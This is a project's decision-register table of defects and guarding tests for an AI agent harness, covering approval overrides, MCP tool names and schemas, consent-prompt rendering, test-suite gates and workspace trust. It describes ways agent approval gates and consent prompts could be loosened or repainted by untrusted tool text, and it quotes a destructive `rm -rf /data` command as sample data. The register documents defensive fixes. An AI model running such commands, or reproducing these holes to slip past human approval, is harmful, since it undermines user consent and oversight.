| **Applying a Pass 6b entry over `run.claims`** | `test_a_retry_round_does_not_re_tier_a_claim_outside_its_batch`, `test_a_narrowed_round_drops_an_entry_naming_a_claim_outside_it` | Batch 149 (S12-02). The apply is the fix site and the `claim_ids` line is not: B5 makes a TOTAL id mismatch the error and a partial one deliberately not, so the batch-plus-one-extra payload a model actually sends passes either setting. Driven, a HIGH claim came out `grounding_status='ungrounded'` with `sources=[]`, still tiered HIGH, its breakdown still recording `source_count: 1` |
| **Calling `score_grounding_sources` from the 6b seam without `claims`** | `test_a_narrowed_round_leaves_that_claim_alone_entirely`, `test_the_wide_default_rewrites_a_claim_the_payload_never_named` | Batch 149 (§66 A26), and the half S12-02 does not name. That function rewrites EVERY claim's `grounding_sources` by default, so a 6b round recomputed claims D1 had finished with while the re-tiering beside it was scoped to the batch. The argument that narrows it had existed since §45 with no caller. Asserted on OBJECT IDENTITY, not equality: with no corpus the rewrite is value-identical, so an equality test would pass against the defect |
| **Dropping a Pass 6b entry outside the batch in silence** | `test_the_trace_names_the_ids_pass_6b_answered_about_outside_its_batch`, `test_a_clean_pass_6b_round_leaves_no_such_trace_line` | Batch 149 (§66 A26). `review.py` settled the policy for this shape: a finding a stage cannot apply is dropped AND traced, because dropping in silence is indistinguishable from applying. 6b's own checkpoint reports how many claims came out CLEAN, which is an effect of the batch and cannot carry it. The second test is the control — a line that appeared whatever the response said would report nothing |
| **Re-tiering the whole run to clear the stale pair instead** | nothing in the suite, and that is why the alternative is recorded here | Batch 149, the rejected half of A26 — and the owner raised it, since one claim's update can reach a global quantity. Measured both ways: the coupling is real and lives in the rescoring stage (hence the row above), and an unconditional global re-tier is reproducibly harmful. A LOW claim D2 exhausted, forced to UNVERIFIED by `_apply_fallback`, comes back as **LOW beside the annotation saying it could not be verified** — the pair `run_confidence_tiering`'s docstring says the narrow call exists to prevent, and the one AGENTS.md already describes |
| **Joining a model-supplied list field with `map(str, value)` in `_render_claims`** | `TestTheClaimsViewSurvivesAFailedRunsRecord` | Batch 149, ruled as §66's A27 — found under S12-01 and on a surface no report reaches. The pipeline persists a snapshot before it re-raises, so a run that died in Pass 5 leaves `assumption_flags: 123` in a durable record, and `/claims <run id>` is how a person opens a failed run. Four fields, one site. The control pins that an ordinary list still renders as a list rather than a repr |
| **Containing that view at the `/` dispatch call site instead** | nothing, and the app still exits | Batch 149. Batch 145's containment is synchronous and `push_screen` returns an `await_mount`, so `compose()` runs in Textual's message pump rather than in the handler's call stack. Measured against the real `ClaimsScreen` in a minimal host app: the TypeError propagates past the try and reaches `_handle_exception`, which batch 145 already measured as exiting the whole application |
| **Merging an agent's `approval_overrides` unfiltered** | `TestTheFourthQuadrant` | Batch 150 (S13-02), ruled as §67's A28. Decision S2's rule is quoted in `child_context`'s own docstring one line above the code that broke it: "Only True entries carry... so unioning can only ever tighten". The parent's dict was filtered and the agent's merged raw, so a `False` in a child's frontmatter turned off a gate the parent had set, and a grandchild came back with `{}` rather than the restored `True` -- gone permanently, not suspended for one run. Three of the four quadrants had tests. The sharper half is the one no report states: `candidate_approvals` reads the same dict and is BOTH the sign-off notice and the grant, so the loosened tool left the candidate list and the user was neither asked at call time nor told at sign-off time |
| **Filtering `active_context`'s copy too** | `test_active_context_keeps_its_unfiltered_copy` | Batch 150, a CONTROL rather than a guard, and the scope half of A28. At depth 0 there is no parent to overwrite, a `False` is inert under D14's OR, and the next hop's filter drops it -- all three measured rather than reasoned about, because "the other composer looks similar" is how a fix grows past its finding. If someone makes this one filter, the test asks them to say why |
| **Typing `approval_overrides` as a mapping and not its values** | `TestApprovalOverrideValuesAreTypedToo` | Batch 150 (§67 A28), and §66's S12-01 shape one file over. `web_search: "false"` parsed to the STRING and `requires_approval` returned `'false'` from a function documented to return a bool, while the two scalar booleans three fields below had been validated since #45 for the stated reason. Measured first: no value widens a gate, because approval ORs and every falsy value already equals an absent key -- so this is a type boundary, not an escalation, and a `False` is still legal to write (the three-state override this file forbids at line 249 is still forbidden) |
| **Answering `False` for an unparseable `disabled`** | `TestAnUnparseableDisabledIsANamedFailure` | Batch 150 (S13-03), ruled as §67's A29. `False` means NOT disabled, so `"disabled": "true"` connected the server and F1's consent line -- which reads `self.disabled` -- printed `srv [user] runs: rm -rf /data` with no note. **The report's suggested shape (fall to `True`) would have re-opened the mirror defect**, and a pinned test is what said so: `test_non_boolean_disabled_falls_back_to_false` asserted that `"disabled": "false"` keeps the server running and its docstring named the alternative as the defect. Neither constant is safe, because the value is the only thing distinguishing the two spellings and `_flag` exists to refuse to interpret it. So the entry is UNUSABLE by name instead, which is decision G verbatim |
| **Replacing that test instead of keeping it green** | `TestAnUnparseableDisabledIsANamedFailure`'s docstring, and `test_a_falsy_non_boolean_is_refused_by_name_too` | Batch 150, recorded because the deletion is the kind that looks like a loosening. `test_non_boolean_disabled_falls_back_to_false` asserted `cfgs["srv"].disabled is False`, which is STILL TRUE of the fixed code -- the field is False -- while the server no longer runs. An assertion that holds on both sides of the change cannot discriminate, so leaving it green beside the new behaviour would have been a guard describing a tree that no longer exists. Its CONCERN is kept as the second test: a server the operator meant to keep running must not silently vanish, and it does not -- it is refused by name, with the reason, in the three places a person looks |
| **Having `_flag` choose the answer** | `test_the_consequence_reaches_the_flag_helper_itself` | Batch 150 (§67 A29). The helper returning a `bool` again makes the asymmetry between the two keys unexpressible, and the docstring's old claim about "both flags" quietly comes back. It returns `Optional[bool]` and each caller states its own safe direction, because the difference between the keys IS the finding. `test_autoApprove_still_falls_back_to_false` is the control: the key whose direction was already right must not change |
| **Registering a composed tool name nothing validated** | `TestAnUnadvertisableNameIsRefused` | Batch 150 (S13-04), ruled as §67's A30. `^[a-zA-Z0-9_-]{1,64}$` is the rule Anthropic, OpenAI and Google all publish, and both halves of `mcp__<server>__<tool>` come from outside this repository -- the installed `mcp==2.0.0` constrains neither (`Tool.model_fields["name"]` is a bare required `str`, pinned by `TestTheSDKImposesNoNameRule`). A dotted `mcp.json` key, a space or a newline from a server, and two ordinary long words (70 characters) all registered AND were advertised. `schemas()` is rebuilt at the top of every model call (K7), so one such name made every request malformed for the rest of the session from a server that was connected and working, and a 400 on a malformed `tools` array is not transient |
| **Mangling an invalid name into validity** | `test_the_rule_is_one_this_projects_own_names_already_satisfy`, and mutation D5 | Batch 150 (§67 A30). A silently renamed tool is one the model cannot name back, and the prefix is not a parser, so a generated name maps to no server. The control is the other direction and is what makes the rule defensible as written: all 31 of this project's own registered names already satisfy it, so it bounds third-party names rather than constraining the project |
| **Advertising a tool whose schema is unbounded** | `TestAnOversizedSchemaLosesTheTool` | Batch 150 (§67 A31), and the half NEITHER report names. `description` is not the only third-party string in an advertised schema: `input_schema` arrives from the server untouched, a property description is model-facing text in the same request, and a 50,082-character one passed through byte-for-byte. Capping the strings INSIDE it was declined -- a truncated enum or pattern is a tool that fails at call time instead of load time -- so the serialised whole schema is bounded and an oversized tool is refused by name. `test_a_schema_the_size_this_harness_ships_is_fine` sizes the bound from measurement rather than taste |
| **Putting an MCP description in a schema unnormalised** | `TestTheDescriptionIsBoundedAtTheProducer` | Batch 150 (S13-05, §67 A31). A5 verbatim: "Catalog text is normalised at the producer -- whitespace collapsed, capped at one constant... at parse time, for every tier." Two of the three sources of model-facing third-party text followed it and the third -- the one arriving from code nobody here reviewed, at connection time, after the consent screen has been answered -- followed neither half. The cap is applied AFTER the prefix and the server-supplied `title` are composed in, so one call covers all three strings; `test_the_title_is_inside_the_bound_not_outside_it` is what fails if that order is reversed. The constant is deliberately not `MAX_CATALOG_TEXT_CHARS`, and `test_the_constant_is_its_own_and_not_the_catalog_one` says so |
| **Firing the non-text placeholder only when no text survived** | `TestTheNonTextPlaceholderIsAppended` | Batch 150 (S13-06), ruled as §67's A32. `if not text and blocks` meant the disclosure was absent on exactly the half where the result still read as complete -- "Chart generated:" with no chart and no note is a result the model will answer from. Appended now, not substituted, so the all-non-text case is unchanged (that one is the control, and it pins what `test_normalize_drops_non_text_blocks_to_a_placeholder` already claimed). `test_whitespace_only_text_still_discloses_the_drop` is the case the finding's own table does not have and the worst of them: `'   '` is truthy, so the text survived the join and the model was handed three spaces that read as success |
| **Reporting an empty text block as non-text content** | `test_an_empty_text_block_is_not_reported_as_non_text` | Batch 150 (§67 A32). `text("")` came back as `[non-text MCP content: text]` -- the placeholder reporting the kind as non-text when the kind is text. It is filtered out of the join either way; it simply has nothing to drop, so the kinds are derived from the blocks the join actually skipped rather than from `type != "text"` |
| **Dropping blocks without logging it** | `test_the_warning_names_the_tool_and_what_was_dropped` | Batch 150 (§67 A32). The rule is #49's, stated in `AGENTS.md` under its own heading: "Every altered dispatch result logs ONE WARNING naming the tool and what changed." `_normalize` altered a dispatch result and logged nothing on all three of its dropping paths -- and could not have obeyed the rule as written, because it took the result alone and had no tool name to name. The name is a PARAMETER now. `test_an_all_text_result_logs_nothing` is the control: a rule that fires on every result trains people past it |
| **Dropping a structured error payload** | `TestAStructuredErrorPayloadSurvives` | Batch 150 (§67 A32). The error branch returned `{"error": text}` and discarded `structured_content`, so a server reporting `{code: 429, retry_after: 30}` lost the one thing that would have explained the failure. Folded into the STRING, not added as a second key: D23 promises `call_tool()` returns one error shape, and a second key makes every consumer of a dispatch error a place that may or may not read it. `test_a_plain_error_is_byte_for_byte_what_it_was` is the control -- the common case must not grow a parenthesis |
| **Bounding the SUCCESS path's `result` while here** | `test_the_success_paths_result_key_is_untouched` | Batch 150, a CONTROL and a scope claim. An unbounded tool RESULT is `TECHNICAL_DEBT 48`, which the marathon measured and which is ruled DEFER. Bounding it in passing would close a filed item halfway and in the wrong module |
| **Leaving `connect_all`'s `_start` task pending** | `TestTheExceptBranchReleasesBothTasks` | Batch 150, ruled as §67's A33 and found by RUNNING S13-08's uncovered path rather than reading it. The except branch released the manager and the loop and not the task it had created two lines earlier: `_start()` is parked on `_ready.wait()`, and it stays parked because `CancelledError` is a `BaseException` so the manager's `except Exception` never reaches its `_ready.set()`. Left pending, asyncio reports "Task was destroyed but it is pending!" through its own logger whenever the GC gets to it -- and `tui/app.py` attaches `TranscriptLogHandler` to the ROOT logger, so that line can reach a user's transcript naming nothing. The ORDER is load-bearing and no return value reports it, which is why the second test is a source relation: a cancellation scheduled after `_shutdown_loop()` is never delivered |
| **Proving AC8 on the graceful path alone** | `test_a_hung_handshake_does_not_strand_its_own_child_or_the_others`, `test_a_caller_side_timeout_leaves_no_child_behind` (both `integration`) | Batch 150 (S13-08). The path with the recorded history of orphaning -- `connect_all`'s own comment: "one hung server orphaned every other server's subprocess" -- was pinned only over the in-process transport, which the integration file's docstring already said cannot see a child. So the orphan-prevention path was proven in the one environment that cannot observe an orphan. Both new cases PASS, and that is the finding: `stdio_client.__aenter__` does clean up under cancellation, which is SDK behaviour this repository depends on and does not own, since `AsyncExitStack.enter_async_context` pushes its exit callback only after `__aenter__` returns. The negative control is the one the report asks for by name -- dropping `_cancel_manager()` makes the second test report a leaked PID |
| **Stating how many non-function-scoped fixtures the suite has, anywhere** | `test_every_file_with_a_module_scoped_fixture_declares_no_test_class` | Batch 151 (§68 A34). Four sentences said `real_storage` was the suite's ONLY one, in four phrasings, and it stopped being true in batch 110; the register's copy cited the grep that refutes it in the same sentence, and batch 128 -- whose whole subject was this claim -- fixed two copies and missed four, because it grepped the sentence rather than the claim. `AGENTS.md`'s fifth copy was the corrected one, "the suite's ONLY two", which is true today and false the moment somebody adds a third. The count is gone from all five and the RULE is gated for every file rather than described for the one that holds the fixtures now. If you add a module- or session-scoped fixture, this gate is what tells you its file may hold no test class -- it reads fixture DECORATORS, so a keyword in any order is found and a docstring mention is not |
| **A test class in any file that has a fixture outliving one test** | `test_every_file_with_a_module_scoped_fixture_declares_no_test_class` | Batch 151 (§68 A34). `--dist loadscope` groups by CLASS where there is one and by MODULE where there is not, so a `Test*` class in such a file is a SECOND group, and a worker taking both sets the fixture up twice. It is a scheduling LOTTERY, not a certainty -- five `-n auto` runs were green and a `-n logical` run was not -- which is why it is checked rather than left to the run that puts the two groups together. The gate asserts its domain in both directions: a walk finding no files and a walk finding no fixtures both pass an `assert not offenders` just as quietly |
| **Stating `test_tui.py`'s class count outside `AGENTS.md`** | nothing -- and that is the decision (§68 A35) | Batch 151 (S19-02). `pytest.ini`'s worked example said "62 classes and so 62 groups" and the file is 71. The argument it makes needs "the classless group was the floor and is not any more" and never needed the integer, so the integer is gone and the one gated copy -- read back out of `AGENTS.md` by `test_agents_md_states_the_real_test_tui_class_count` -- is the only one left. **Three of the finding's five "copies" were not copies**: `tests.yml` and `test_tui.py` say the 183 CLASSLESS tests became 41 classes, which is what batch 114 did, and `TECHNICAL_DEBT`'s 62 is a record of a measured run. A figure inside a record of a measurement is not drift, and "correcting" the 21 in `pytest.ini`'s same sentence to 41 would have introduced an error: 21 pre-existing plus 41 new is the 62 it stated |
| **Comparing `markexpr` against a literal copy of `pytest.ini`'s addopts** | `test_the_default_marker_expression_is_read_and_not_restated`, `test_the_default_invocation_is_not_treated_as_narrowed` | Batch 151 (§68 A36). `_was_narrowed` compared against `"not integration"`, so adding a marker to addopts -- a two-line change, because `--strict-markers` -- made every full run read as NARROWED: three count gates skip and `test_the_subprocess_collection_agrees_with_the_session`, which has no file-alone fallback, stops running anywhere. Silently, which is the direction the guard's own docstring names as the one it most needs to avoid. This is shape 1 inside the file written to kill shape 1, and that file's header states the rule: "never against another hand-written number" |
| **Giving `_FakeConfig` a `markexpr` that does not come from its own addopts** | `test_the_default_invocation_is_not_treated_as_narrowed` | Batch 151 (§68 A36). `_FakeOption.__init__` carried the SAME literal as `_was_narrowed`, so the guard asserted that two copies of one string agreed with each other and could not fail for the drift it exists to catch. The fake derives its `markexpr` from its own `addopts` now, so "a default run" is default by construction; pass `markexpr=` explicitly only to model a command-line `-m`, which is what the narrowing cases below it do |
| **A suite-wide scan that resolves its path against the working directory** | `test_no_test_module_defines_its_own_settle` | Batch 151 (§68 A37). It globbed `Path("tests")` -- 124 files from the repository root, 0 from one directory up -- and pytest does not chdir, so an IDE or absolute-path invocation ran it green having read nothing. The scan is anchored on `__file__` and asserts `len(paths) > 20` before asserting anything about the contents, which is `docs/ARCHITECTURE.md` section 11's first entry by name: "a check that passes by finding nothing cannot tell it looked in fewer places ... pin the input in both directions". Demonstrated both ways: with a planted `def settle` the guard now fails from the parent directory, where before it passed |
| **Restating CI's pytest invocation in the root conftest's worker table** | nothing mechanical; the table points at `pytest.ini` (§68 A38) | Batch 151 (S19-05). The four-dial table annotated `-n logical` as "(what CI runs)" and CI runs the default -- so the file that OWNS the `-n auto` decision was the one file describing CI as taking the other branch, in the line a reader opens to learn what the dials mean, and `AGENTS.md` names that conclusion as something not to re-derive. Deliberately left as prose: a gate reading a workflow's `run:` line would be a fourth copy of the invocation, and the honest fix is to stop having one |
| **Adding a stub to `_install_fake_sdks` without naming it in the header** | `test_the_root_conftest_header_names_every_module_it_stubs` | Batch 151 (§68 A38). The header listed seven fakes and the installer installs `markitdown` too, which matters because the paragraph two below is a `NOT faked, by explicit decision` list -- so the first reads as the complete set rather than as an example, and `docs/ARCHITECTURE.md` records the cost of getting that wrong: "a green local suite is not a green fresh install". Both directions are checked, so removing a stub and leaving its name also fails; a dotted child counts as named by its parent, so `google.genai.types` under a header saying `google.genai` is not a miss. The gate reads the paragraph beginning "Injects fake" by name and fails loudly if that sentence is reworded, rather than widening its domain in silence -- which it did on its first run, when two function names in batch 151's own added prose read as claimed stubs |
| **Evaluating `needs_wsl`'s condition at import time** | `TestTheGateIsLazy::test_importing_this_module_asks_nothing` | Batch 151 (§68 A39). `pytest.mark.skipif(not _has_wsl(), ...)` ran the probe when the module was imported, and an xdist worker performs its own full collection -- so a default run on this box made 11 live `wsl.exe` calls, each bounded at 20s, before a single test body. A STRING condition is evaluated in `pytest_runtest_setup` instead, which was measured on pytest 9.1.1 along with the two properties it depends on: the string resolves against the MODULE's globals even for a method, and deselecting the gated tests evaluates it zero times. The test asserts by SABOTAGE, because the broken form and the fixed one differ by two quote characters: it re-imports the module with the probe's subprocess rigged to raise and sees whether the import survives |
| **Removing `functools.cache` from `_has_wsl`** | `TestTheGateIsLazy::test_the_probe_is_cached` | Batch 151 (§68 A39). The string condition is evaluated once per gated ITEM, so the cache is what keeps three tests at one subprocess instead of three. Asked of `functools` rather than of a call count, because by the time this test runs the three gated tests may already have asked |
| **Reading `pytest.ini`'s "no process, no socket" as true on Windows** | nothing -- the sentence names its exception now (§68 A39) | Batch 151 (S19-13). Two independent things made it false and the finding names one. The collection-time probe is fixed; the other is that the three `needs_wsl` tests drive a real distribution IN THEIR BODIES and are not marked `integration`. So the finding's preferred outcome -- "the sentence can stay as written, and that is the better outcome, because it is the stronger claim" -- was never available, and the sentence names the three instead. They are NOT being marked `integration`: that would make the claim true as written at the cost of moving three live tests into a set no workflow runs (S19-06) |
| **Asserting that three `resize_terminal` calls arm exactly three timers** | `test_a_drag_re_arms_rather_than_stacking` | Batch 151 (TECHNICAL_DEBT 97). In a 366-second full-suite run `armed` was two timers for three calls: the pump coalesces `Resize` when the app is behind, so the handler had behaved correctly for every message it was given, and the arity was the one claim in that test about textual's DELIVERY rather than about this widget. The invariant is asserted instead -- every armed timer but the last was stopped, and `_reflow_timer` is the last -- with a floor of TWO rather than nothing, because one delivery cannot show coalescing and `assert armed` alone would go vacuous in the direction that hides the bug |
| **Waiting for the quit gesture's channel release with a raw `pause()`** | `test_quitting_by_gesture_releases_a_blocked_worker` | Batch 151 (TECHNICAL_DEBT 85, closed). This is the ONE site of that entry's six where a predicate was needed, and the entry's stated reason is wrong: the state is produced by the MESSAGE PUMP, not by another thread. A key is POSTED, so `press` can return before the binding fires, and `pause()` ends on `wait_for_idle(0)` -- a process-wide CPU heuristic measured at 21ms idle and 1021ms with one busy sibling thread. It failed exactly once, in a 635-second run, with `channel.puts == []` |
| **Adding a `pause()` before `exit()`'s channel assertion** | `test_quitting_with_a_prompt_open_releases_the_blocked_worker` | Batch 151 (TECHNICAL_DEBT 85). The pause was DELETED rather than replaced with a predicate, and the absence is the assertion: `exit()` calls `_release_permission_channel()` inside itself, before `super().exit()`, so the boolean is on the channel before the call returns. Asserting with no wait at all is what pins the property ARCHITECTURE §4.14 depends on. The other four of that entry's six are unchanged, and two of them were never candidates -- they use `pump` ahead of NEGATIVE assertions, which is the one thing `AGENTS.md` says `pump` is for. Measured, not read: with `Pilot.pause` replaced by a bare `asyncio.sleep(0)` all six passed, and the probe's reach was proved by sabotaging the same monkeypatch |
| **Tampering with a ciphertext by ASSIGNING a byte instead of changing it** | `TestTheEnvelope::test_it_does_not_say_WHICH_part_was_wrong` | Batch 151 (rider, found by the batch's own full-suite run). The tamper set the first `ct` byte to `\x00`; AES-GCM output starts with that byte once in 256 envelopes -- **6 of 2000, measured** -- and on those the file is unchanged, `unlock` SUCCEEDS and the test fails with DID NOT RAISE. It XORs the byte now, and every edit in the loop is asserted to have CHANGED the envelope, which is the property all three of them need and the next one to be added. The parameter edit reads `secrets.MIN_SCRYPT_N` rather than a literal `1 << 14`: they are the same number today, and one step below the floor `_open` raises `StoreUnreadable`, a sibling of `WrongPassphrase` that `pytest.raises` here would not catch |
| **Printing an untrusted string in `main.py` without `core/ansi.for_display`** | `TestNothingUntrustedCanRedrawAConsentPrompt`, parametrised over `_PAYLOADS` | Batch 152 (S16-02, A40/A42). Thirteen fields across all seven kinds reached stdout carrying a raw ESC, and nine of them a raw carriage return as well -- the approval headline, notice and rationale, the question and its options, the sign-off's agent and candidates, confirm's title and body, choice's proposal/reason/options, secret's title and body, and all four fields of a review finding. CSI `2K` erases the row the approved command was drawn on. The sweep is a RELATION over the kind table, which is held against `interaction.SAFE_DEFAULTS` by its own guard, so a new kind with an unscrubbed handler fails without anyone extending a list -- and it found a site reading the function did not: `_choice` renders its option list twice, and the second rendering is not a line a reader thinks of as display. What the sweep CANNOT see is a new print outside the seven handlers, and the named tests beside it cover the three fields `_PAYLOADS` does not carry |
| **Stripping a control from a consent prompt silently** | `test_the_prompt_says_something_was_removed`, per kind | Batch 152 (A41). The owner's ruling, and the half a silent strip does not give: a tool call whose headline tries to move the cursor is evidence about the decision being asked, and nothing a tool legitimately needs to do involves redrawing a consent prompt. One line, above the question, counting per PROMPT rather than per field -- the user is told once that this call tried to repaint |
| **Warning on a prompt that carried no control** | `test_a_clean_payload_renders_with_no_warning`, per kind | Batch 152 (A41). The control for the row above. A filter that warns on everything is a filter nobody reads, and a test that only ever feeds poison cannot tell the two apart. Folding CRLF to LF is deliberately NOT counted, so ordinary text that arrived with Windows line endings raises nothing |
| **Returning the empty set from `_signoff` for a line that named nothing** | `test_a_line_naming_nothing_refuses_the_spawn`, `test_a_line_of_numbers_that_name_nothing_refuses_too` | Batch 152 (S16-01, A43). `set()` is already the explicit `none` -- a legitimate answer a user can give -- and `core/loop.py:440` spawns on `answer is not None`, so a mistyped refusal authorised the spawn. Measured through the real channel and the real `decode`: `xyz` and `0 99` both returned `set()` and both SPAWNED. The three cells around this were pinned and no test typed a non-blank line that named nothing, which is how a hole between two green cells stayed green |
| **Refusing a sign-off because SOME piece of the line was unreadable** | `test_a_mixed_line_still_grants_what_it_named` | Batch 152 (A43). The control for the row above, and the reason the fix is "no valid piece" rather than "any invalid piece": `1 xyz` named one candidate and misspelled something else, and refusing over the second half would discard an answer the user did give. The per-piece message already says what was ignored |
| **A silent sign-off refusal** | `test_the_refusal_says_which_kind_of_refusal_it_was` | Batch 152 (A43). A user who typed a tool NAME instead of its number gets a refused spawn, and "nothing there named a tool" is the difference between an answer they can correct and a bug. The blank case says "no answer" and cannot be reused here, because there was one |
| **Releasing an unterminated carry at a display boundary** | `TestTheOneShotDisplayFilter::test_an_unterminated_sequence_is_dropped_not_released` | Batch 152 (A40/A45). `for_display` takes the transcript's answer, `release_unterminated=False`, for the transcript's reason: `ESC [` with no final byte consumes whatever is printed after it, and what is printed after this is the next line of a consent prompt. The pty's default is unchanged and still argued where the flag is defined |
| **Keeping a lone carriage return at a display boundary, or removing one on the pty path** | `test_a_lone_carriage_return_goes_where_the_pty_keeps_it` | Batch 152 (A45). THE ONE PLACE THE CONTRACTS DISAGREE, and both halves are asserted in one test so a later reader cannot tidy them into agreement. The pty keeps it because interpreting it would be emulation; at a terminal it is not ambiguous at all -- it returns the cursor to column 0 and the next text overwrites the line being read. Backspace, vertical tab and form feed go with it because they move a cursor too; a newline and a tab stay as the only two a caller means |
| **Counting the CRLF fold as a removed control** | `test_crlf_folds_and_is_not_counted` | Batch 152 (A41). The count is what the CLI says out loud, so counting a normalisation would raise the warning on ordinary Windows text -- the false positive that gets a filter turned off. Measured as the pair `("one\ntwo", 0)` |
| **Naming a private symbol in `AGENTS.md` that exists nowhere in the tree** | `test_every_private_symbol_agents_md_names_exists_in_the_tree` | Batch 152 (S16-03, A44). `_ASK_HANDLERS` was named for 24 batches and `git log -S` finds only the docs commit that coined it, so it was BORN stale -- the shape no convention catches, because nobody ever edited code and forgot the document. The domain is every backquoted token beginning with an underscore (131 measured, 130 resolving), and the resolution rule is a substring match chosen by measuring two stronger candidates that both fail on correct references: the AST index on 17, a `tokenize` NAME index on 8 of which three are Textual's or CPython's symbols. Both floors are asserted, because a scan matching no tokens or reading no sources would pass while checking nothing |
| **Letting the documented-symbol gate resolve a name against its own explanation** | the same gate, with `_all_python_sources` excluding `__file__` | Batch 152 (A44). The first form was GREEN with `_ASK_HANDLERS` written back into AGENTS.md, because the gate's comment block explains the defect by name and a substring scan cannot tell code from the paragraph written to forbid it. Batch 151's conftest-header gate failed in exactly this way one batch earlier, and both were found by the control rather than by reading. A gate's evidence may not come from its own explanation of what it forbids -- and the same rule applies to the document: `AGENTS.md` does not get to name the symbol either, not even to say it is absent |
| **Letting `_settle_trust` raise out of `generate()`** | `TestTheTrustSettleIsTotal::test_no_OSError_leaves_generate`, `test_a_store_that_cannot_be_written_still_reports_the_files` | Batch 153 (S17-02, A46). `grant_trust` raises `OSError` from either half -- `_save_trust_store` writes the store, `_content_hash` re-reads every file the grant covers -- and #95 put the call on both paths OUTSIDE the `try` on both of them. Measured through the real function: both config files on disk, `is_trusted` True -> False, the notice replaced by a raw `OSError`, and on the CLI a traceback, since `run_init_command` catches `InitError` only. The TYPE is named in its own test because a later fix that raised `InitError` from the settle would keep every other assertion green and still be wrong about a run that wrote every file it was asked to |
| **Putting the trust warning anywhere but first on the success path** | `test_the_warning_leads_the_report`, and `test_a_settled_run_keeps_the_note_last` as the control | Batch 153 (A46). The files are on disk and the user can see them; what they cannot see is that the next launch will ask about this project again. The control is the half that makes the pair mean something: a fix that moved EVERY trust line to the top would pass the first test and change the receipt of every successful `/init`, so the settled ordering is pinned too |
| **Raising instead of reporting when the re-grant could not persist** | `test_it_says_the_re_grant_did_not_happen`, `test_the_cli_reports_a_failed_re_grant_and_exits_zero` | Batch 153 (A46). The owner's ruling: files on disk are a finished `/init`, so the exit code stays 0 and the trust bookkeeping is reported rather than promoted to a failure. `json_store` argues that a grant which silently did not persist is worse than a crash, and that argument is about SILENCE -- this ends it rather than softening the policy. Driven through `run_init_command` rather than asserted of it, because the handler set is the defect |
| **Settling trust before the failure report is assembled, or dropping the note from it** | `test_a_failed_re_grant_does_not_discard_the_failure_report`, and `test_a_write_failure_alone_still_reports_a_good_settle` as the control | Batch 153 (S17-02). The settle ran after `failure` was captured and before it was reported, so its exception threw the whole report away -- including the "wrote N files before that" accounting #95 existed to add, which is the only way to tell "nothing happened" from "most of it did". The control is #95's own claim, repeated because the two poisons in the row above are one edit away from making it vacuous |
| **Reading the pre-write trust state without a guard** | `test_an_unreadable_trust_state_does_not_stop_the_run` | Batch 153 (S17-02, A47). The I6 capture hashes every file the grant covers, so it is a read of somebody else's files -- one an editor holds, one a sync client is mid-write on -- and it sat before the `try`, so one unreadable file killed `/init` before it wrote anything, as a raw `PermissionError`. `_read_existing_context` three functions up catches `OSError` on the SAME file for the SAME reason and degrades; this is one function stopping giving one error two answers |
| **Reading an unanswerable trust state as TRUSTED** | `test_an_unreadable_trust_state_attempts_no_re_grant` | Batch 153 (A47). The control for the row above, and the direction that would be a hole rather than a crash: an untrusted `.venastine/` may already hold agents, skills and an `mcp.json` that arrived with a clone, so a re-grant triggered by one unreadable file would launder all of it in. `False` for an unanswerable question is `core/workspace_trust.py`'s own posture -- `_load_trust_store` returns `{}` for anything unreadable and says it fails CLOSED in both senses |
| **Naming a file in AGENTS.md's trust-hash promise that the hash does not cover** | `test_the_file_agents_md_promises_is_inside_the_trust_hash` | Batch 153 (S17-05, A49). I6 promised that `CONTEXT.md` "is never special-cased out of the hash" for thirty-odd batches after section 44 deleted that file -- a guarantee about a file that is not in the hash because it does not exist, leaving the guarantee that matters (WS9 puts the root `AGENTS.md` in the listing, so a cloned hub cannot reach a system prompt unasked) unstated. The filename is captured BY THE PATTERN, adjacent to the phrase, not by scanning the paragraph: batch 152 lost a gate twice to a scan that could not tell code from the prose written about it, and this paragraph now names the old filename while explaining that it is gone. Compared against `content_files()`, which IS the hash's input set by construction since section 44, with the fixture's listing asserted exact and the pre-153 name asserted ABSENT -- so the pass means the test it would have failed is the test it ran |
| **Naming the project context tier by a filename** | the gate above, for I6; the rest by convention (A49) | Batch 153 (S17-05). Fifteen live copies of one claim across eight files, eleven of them in the suite, all made false by section 44 moving the hub to the root `AGENTS.md`. "The project hub" is true before and after that move, so the role is what these sentences name now -- the filename is what let one relocation falsify fifteen places at once. **No gate over the word itself**: it is legitimate in the past-tense accounts in `docs/DEVLOG.md`, `docs/ROADMAP_v2.md` and AGENTS.md's own "gone outright", and the historical allowlist that would permit those would permit the three defects it was built to catch |
| **Comparing tier-1 thread ids as plain strings** | `test_the_hex_and_dashed_spellings_are_one_id`, `test_a_recorded_pass_thread_is_relabelled_with_both_sides_real` (real SQLite) | Batch 154 (S09-01, A50). `pass_threads_json` carries `str(thread_id)` -- dashed, 36 characters -- and `conversationthread.id` comes out of the DBAPI as the 32 hex characters sqlmodel stores, so `'a-b' in {'ab'}` was False for every id there has ever been and the tier #82 calls authoritative relabelled nothing. Normalise the RECORDED ids through `_as_uuid_key`; the row ids are compared as the column holds them, and that assumption is pinned by `test_a_thread_id_is_stored_in_a_spelling_str_does_not_produce` rather than branched on -- parsing the row ids too is the symmetric version control C1 found unearned, and `test_a_thread_whose_own_id_is_not_a_uuid_is_left_alone` is what refuses it |
| **Dropping a run to the window tier because one recorded id is unreadable** | `test_an_unreadable_recorded_id_does_not_open_that_runs_window` | Batch 154 (A50). A POPULATED `pass_threads_json` is what puts a run in tier 1, whatever its ids parse as. Making `usable` depend on the parse looks tidier and consults a modern run's clock, which hides the concurrent chat thread #82's headline is about -- the unrecoverable direction |
| **Hand-writing one id spelling on both sides of a classification test** | nothing -- which is the problem | Batch 154 (S09-01). All four tier-1 tests did, so producer format and storage format agreed by construction and eleven tests passed with the tier dead. `_stored(name)` and `_recorded(name)` in `test_thread_legibility.py` are the two real spellings of one UUID; a test that writes its own string is back to measuring nothing |
| **Injecting a memory header at a cap of 0** | `test_a_cap_of_zero_injects_nothing_at_all`, `test_both_halves_of_off_agree_at_zero` | Batch 154 (S09-02, A51). `rows[:0]` is empty and `total > 0` fires the truncation branch, so every turn announced "showing the 0 most recent of 2" while `remember`'s `available_check` had already hidden the tool -- memories the run could never earn access to, advertised as withheld |
| **Warning on every turn at a cap of 0** | `test_a_cap_of_zero_warns_about_nothing` | Batch 154 (A51). The other half of the same noise, and the control for the row above: a WARNING naming a value the user set on purpose and telling them to raise it. A fix that returns "" but logs first passes the row above and fails this one |
